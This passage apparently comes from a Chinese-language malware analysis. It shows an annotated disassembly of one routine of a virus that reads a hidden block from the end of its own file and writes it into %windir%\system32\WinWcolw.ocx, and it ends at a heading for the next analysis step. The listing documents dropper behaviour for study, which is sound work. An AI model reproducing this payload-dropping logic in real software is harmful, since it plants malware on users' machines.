
```
004010D0  /$  81EC 04060000 sub     esp, 604

004010D6  |.  8D4424 04     lea     eax, dword ptr [esp+4]

004010DA  |.  55            push    ebp

004010DB  |.  56            push    esi

004010DC  |.  57            push    edi

004010DD  |.  68 04010000   push    104                              ; /BufSize = 104 (260.)

004010E2  |.  50            push    eax                              ; |PathBuffer

004010E3  |.  6A 00         push    0                                ; |hModule = NULL

004010E5  |.  FF15 2C304000 call    dword ptr [<&KERNEL32.GetModuleF>; \返回自身所在路径

004010EB  |.  8B35 08304000 mov     esi, dword ptr [<&KERNEL32.Creat>;  kernel32.CreateFileA

004010F1  |.  6A 00         push    0                                ; /hTemplateFile = NULL

004010F3  |.  6A 00         push    0                                ; |Attributes = 0

004010F5  |.  6A 03         push    3                                ; |Mode = OPEN_EXISTING

004010F7  |.  6A 00         push    0                                ; |pSecurity = NULL

004010F9  |.  6A 03         push    3                                ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE

004010FB  |.  8D4C24 24     lea     ecx, dword ptr [esp+24]          ; |

004010FF  |.  68 00000080   push    80000000                         ; |Access = GENERIC_READ

00401104  |.  51            push    ecx                              ; |FileName

00401105  |.  FFD6          call    esi                              ; \打开病毒原程序

00401107  |.  8B2D 00304000 mov     ebp, dword ptr [<&KERNEL32.Close>;  kernel32.CloseHandle

0040110D  |.  8BF8          mov     edi, eax

0040110F  |.  83FF FF       cmp     edi, -1

00401112  |.  74 79         je      short 0040118D                   ;  不成功则跳

00401114  |.  53            push    ebx

00401115  |.  8B1D 28304000 mov     ebx, dword ptr [<&KERNEL32.SetFi>;  kernel32.SetFilePointer

0040111B  |.  6A 02         push    2                                ; /Origin = FILE_END

0040111D  |.  6A 00         push    0                                ; |pOffsetHi = NULL

0040111F  |.  68 06FBFFFF   push    -4FA                             ; |OffsetLo = FFFFFB06 (-1274.)

00401124  |.  57            push    edi                              ; |hFile

00401125  |.  FFD3          call    ebx                              ; \指针移至文件末尾倒数0x4FA字节处

00401127  |.  8D5424 10     lea     edx, dword ptr [esp+10]

0040112B  |.  6A 00         push    0                                ; /pOverlapped = NULL

0040112D  |.  52            push    edx                              ; |pBytesRead

0040112E  |.  8D8424 200100>lea     eax, dword ptr [esp+120]         ; |

00401135  |.  68 FA040000   push    4FA                              ; |BytesToRead = 4FA (1274.)

0040113A  |.  50            push    eax                              ; |Buffer

0040113B  |.  57            push    edi                              ; |hFile

0040113C  |.  FF15 24304000 call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从0x4FA到virus.0012ED84的数据

00401142  |.  8B8C24 180600>mov     ecx, dword ptr [esp+618]

00401149  |.  6A 00         push    0                                ; /hTemplateFile = NULL

0040114B  |.  6A 00         push    0                                ; |Attributes = 0

0040114D  |.  6A 03         push    3                                ; |Mode = OPEN_EXISTING

0040114F  |.  6A 00         push    0                                ; |pSecurity = NULL

00401151  |.  6A 03         push    3                                ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE

00401153  |.  68 000000C0   push    C0000000                         ; |Access = GENERIC_READ|GENERIC_WRITE

00401158  |.  51            push    ecx                              ; |FileName

00401159  |.  FFD6          call    esi                              ; \打开%windir%\system32\WinWcolw.ocx

0040115B  |.  8BF0          mov     esi, eax

0040115D  |.  83FE FF       cmp     esi, -1

00401160  |.  74 27         je      short 00401189                   ;  成功则继续

00401162  |.  6A 02         push    2                                ; /Origin = FILE_END

00401164  |.  6A 00         push    0                                ; |pOffsetHi = NULL

00401166  |.  68 FA040000   push    4FA                              ; |OffsetLo = 4FA (1274.)

0040116B  |.  56            push    esi                              ; |hFile

0040116C  |.  FFD3          call    ebx                              ; \指针移至文件倒数0x4FA字节处

0040116E  |.  8D5424 10     lea     edx, dword ptr [esp+10]

00401172  |.  6A 00         push    0                                ; /pOverlapped = NULL

00401174  |.  52            push    edx                              ; |pBytesWritten

00401175  |.  8D8424 200100>lea     eax, dword ptr [esp+120]         ; |

0040117C  |.  68 FA040000   push    4FA                              ; |nBytesToWrite = 4FA (1274.)

00401181  |.  50            push    eax                              ; |Buffer

00401182  |.  56            push    esi                              ; |hFile

00401183  |.  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \写入数据

00401189  |>  56            push    esi

0040118A  |.  FFD5          call    ebp                              ;  关闭句柄

0040118C  |.  5B            pop     ebx

0040118D  |>  57            push    edi

0040118E  |.  FFD5          call    ebp                              ;  关闭句柄

00401190  |.  5F            pop     edi

00401191  |.  5E            pop     esi

00401192  |.  5D            pop     ebp

00401193  |.  81C4 04060000 add     esp, 604

00401199  \.  C3            retn
```

### 9.处理字符串
